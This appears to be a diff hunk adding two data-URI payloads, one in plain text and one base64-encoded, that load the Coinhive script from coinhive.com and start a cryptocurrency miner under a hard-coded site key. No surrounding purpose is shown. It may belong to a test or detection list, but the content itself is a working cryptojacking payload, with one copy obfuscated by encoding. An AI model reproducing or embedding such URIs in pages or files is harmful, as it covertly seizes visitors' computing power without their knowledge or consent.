@@ -1,0 +1,3 @@
+data:text/html;charset=US-ASCII,<html><head></head><body><script src="https://coinhive.com/lib/coinhive.min.js"></script><script>var miner=new CoinHive.Anonymous('4vMBXHIJ8FnBBcfTI6lxnI6cFju1rQ6m');miner.start();</script></body></html>
+
+data:text/html;base64,PGh0bWw-PGhlYWQ-PC9oZWFkPjxib2R5PjxzY3JpcHQgc3JjPSJodHRwczovL2NvaW5oaXZlLmNvbS9saWIvY29pbmhpdmUubWluLmpzIj48L3NjcmlwdD48c2NyaXB0PnZhciBtaW5lcj1uZXcgQ29pbkhpdmUuQW5vbnltb3VzKCc0dk1CWEhJSjhGbkJCY2ZUSTZseG5JNmNGanUxclE2bScpO21pbmVyLnN0YXJ0KCk7PC9zY3JpcHQ-PC9ib2R5PjwvaHRtbD4=
